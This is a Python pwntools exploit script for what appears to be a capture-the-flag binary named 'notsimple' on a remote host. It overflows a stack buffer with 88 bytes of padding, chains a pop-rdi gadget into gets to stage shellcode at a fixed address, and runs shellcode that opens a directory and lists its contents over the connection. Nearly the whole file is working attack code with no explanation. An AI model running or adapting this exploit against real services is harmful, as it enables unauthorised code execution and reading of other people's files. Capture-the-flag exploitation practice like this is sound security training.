from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './notsimple'
HOST = '193.57.159.27'
PORT = 35316

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [0x128a])
rdi = 0x4012eb

buf = 0x404110

payload = ''
payload += 'A'*88
payload += flat(rdi, buf, elf.plt.gets, buf)

r.sendlineafter('> ', payload)

payload = ''
payload += asm('''
	xor rax, rax
	mov rdi, 0
	mov rsi, {}
	mov rdx, 0x100
	syscall

	mov rax, 2
	mov rdi, {}
	xor rsi, rsi
	mov rdx, 0x200000
	syscall

	mov rdi, rax
	mov rsi, {}
	mov rdx, 0x400
	mov rax, 78
	syscall

	mov rax, 1
	mov rdi, 1
	mov rsi, {}
	mov rdx, 0x400
	syscall
'''.format(buf+0x100, buf+0x100, buf+0x100, buf+0x100))
if args.R:
	r.sendline(payload)
else:
	r.sendlineafter('?\n', payload)
sleep(0.2)
r.send('/pwn'.ljust(0x100, '\x00'))
r.interactive()
r.close()
